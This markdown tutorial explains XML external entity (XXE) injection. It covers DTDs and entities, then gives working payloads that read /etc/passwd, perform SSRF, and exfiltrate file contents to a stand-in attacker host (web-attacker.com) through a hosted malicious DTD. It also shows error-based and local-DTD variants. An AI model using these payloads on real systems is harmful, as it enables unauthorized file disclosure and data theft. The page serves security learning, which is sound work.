# XXE (XML external entity) injection

XXE (XML External Entity) is a vulnerability that occurs when an attacker can manipulate or inject malicious XML content into an application, leading to the potential disclosure of sensitive information or denial of service. This typically happens when the application processes XML input from untrusted sources without proper validation, allowing attackers to exploit the XML parsing functionality to their advantage.

### Table of content 

- [XML](#xml)
    - [Document type definition](#document-type-definition)
    - [XML entities](#xml-entities)
- **Exploit**
    - [Retrieve files](#retrieve-files)
    - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
    - [Blind XEE](#blind-xee-vuln)
      - [Detecting blind XXE using out-of-band (OAST) techniques](#detecting-blind-xxe-using-out-of-band-oast-techniques)
      - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
      - [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
      - [Exploiting blind XXE by repurposing a local DTD](#exploiting-blind-xxe-by-repurposing-a-local-dtd)
## XML

XML (Extensible Markup Language) is a versatile and structured markup language used for storing, transporting, and exchanging data. It's known for its human-readable format and plays a critical role in various web technologies and data storage solutions. Its popularity has now declined in favor of the JSON format.

### Document type definition

A Document Type Definition (DTD) in XML is a declaration that defines the structure and the legal elements and attributes of an XML document. It provides a set of rules for validating the structure and content of the XML document, ensuring that it conforms to a specific format or schema.

### XML entities

XML entities are placeholders used within an XML document to represent and reference data, enabling the reuse and organization of content. They are commonly employed to manage and structure data effectively in XML documents.

#### Default entities

Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

#### Custom entities

```html
<!DOCTYPE bookInfo [
  <!ENTITY bookTitle "Harry Potter and the Philosopher's Stone">
]>
<book>
  <title>&bookTitle;</title>
  <author>J.K. Rowling</author>
</book>
```

#### External entities

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:

```html
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

The URL can use the file:// protocol, and so external entities can be loaded from file. For example:

```html
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

## Exploit

## Retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```html
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

## Exploiting XXE to perform SSRF attacks

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system.

```html
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Blind XEE vuln

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

### Detecting blind XXE using out-of-band (OAST) techniques

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. 

```html
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

#### XXE attacks using regular entities are blocked

For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

```html
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

```html
%myparameterentity;
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```html
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

### Exploiting blind XXE to exfiltrate data out-of-band

This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:

```html
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
- Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
- Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
- Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL: `http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:

```html
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### Exploiting blind XXE to retrieve data via error messages

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve.

```html
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
- Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.
- Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.
- Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

This entities can be saved on your exploit server and inject `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit.dtd"> %xxe;]>` without calling `&xxe;` it will print the error.

### Exploiting blind XXE by repurposing a local DTD

If both precedent solutions doesn't worked, In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification.

If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.

For example, suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called custom_entity. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following:

```html
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

This DTD carries out the following steps:

- Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem.
- Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file.
- Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. This results in the desired error message.

#### Locating an existing DTD file to repurpose

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:

```html
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search.

```html
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

---

[**:arrow_right_hook: Back home**](/README.md)